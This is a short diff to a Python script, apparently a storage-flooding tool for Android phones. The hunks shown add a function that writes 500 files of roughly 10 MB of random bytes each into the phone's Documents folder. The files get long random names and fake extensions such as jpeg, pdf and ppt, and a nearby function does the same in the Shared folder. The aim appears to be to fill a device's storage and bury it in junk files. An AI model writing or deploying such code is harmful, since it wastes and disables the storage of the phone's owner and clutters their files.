@@ -2,7 +2,7 @@ import os
 import secrets
 import time
 
-extension = ['jpeg', 'png', 'apk', 'mp4', 'mp3', 'ppt', 'pdf']
+extension = ['jpeg', 'png', 'apk', 'mp4', 'mp3']
 
 def display():
     print(
@@ -95,6 +95,20 @@ def file4():
             
 
         desk = os.path.join("/storage/emulated/0/Shared", randomfile)
+        
+
+        with open(desk, 'wb') as file:
+             file.write(secrets.token_bytes(9999999))
+
+def file5():
+    for v in range(500):
+        randomfilename = secrets.token_urlsafe(500)
+        randomextension = secrets.choice(["jpeg", "png", "pdf", "ppt", "rst"])
+        randomfile = f"{randomfilename}.{randomextension}"
+
+            
+
+        desk = os.path.join("/storage/emulated/0/Documents", randomfile)
         
 
         with open(desk, 'wb') as file:
